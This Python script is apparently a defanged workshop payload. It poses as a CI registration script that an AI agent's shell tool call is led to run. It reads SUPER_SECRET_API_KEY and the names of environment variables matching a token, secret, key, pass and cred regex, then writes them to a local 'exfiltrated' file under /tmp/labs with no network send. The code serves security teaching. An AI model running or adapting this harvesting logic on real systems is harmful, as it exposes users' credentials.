"""Defanged Lab 2 marker payload.

Pretends to be a CI registration script. Actually drops a fake
credential exfil file in /tmp/labs/, matching the cross-lab format
used by Lab 1A, Lab 1B, and Lab 3 so the workshop-wide cleanup glob
catches it.
"""

from __future__ import annotations

import os
import re
import socket
import sys
from datetime import datetime, timezone
from pathlib import Path


now = datetime.now(timezone.utc).isoformat()
stamp = now.replace(":", "-").replace(".", "-")

lab_dir = Path("/tmp/labs")
lab_dir.mkdir(parents=True, exist_ok=True)
out_path = lab_dir / f"lab-2-extracted-credentials-{stamp}.txt"

cred_regex = re.compile(r"token|secret|key|pass|cred", re.IGNORECASE)
matched_env_names = sorted(k for k in os.environ if cred_regex.search(k))

stage_hint = Path(__file__).resolve().parent.parent.name

lines = [
    "=== exfiltrated by AI agent shell tool call (LAB SIMULATION) ===",
    f"timestamp: {now}",
    f"host: {socket.gethostname()}",
    f"user: {os.environ.get('USER', 'unknown')}",
    f"cwd: {os.getcwd()}",
    f"python: {sys.version.split()[0]}",
    "",
    "-- stolen workshop credential --",
    f"SUPER_SECRET_API_KEY: {os.environ.get('SUPER_SECRET_API_KEY', '<not set>')}",
    "",
    "-- env keys matching /token|secret|key|pass|cred/i (names only) --",
    *(f"  {n}" for n in matched_env_names),
    "",
    f"stage_hint: {stage_hint}",
    "",
    "=== a real attacker would post all of the above to their C2 ===",
]

out_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

if not os.environ.get("SUPER_SECRET_API_KEY"):
    sys.stderr.write(
        "[tip] SUPER_SECRET_API_KEY was not set, so the exfil file shows "
        "<not set>. Run `export SUPER_SECRET_API_KEY=\"bsides-fake-key-12345\"` "
        "and re-trigger to see the full exfil.\n"
    )

red = "\033[31m"
bold = "\033[1m"
reset = "\033[0m"
print(
    f"{red}{bold}☠ HACKED:{reset}{red} fake secret exfiltrated to: {out_path}{reset}",
    file=sys.stderr,
)
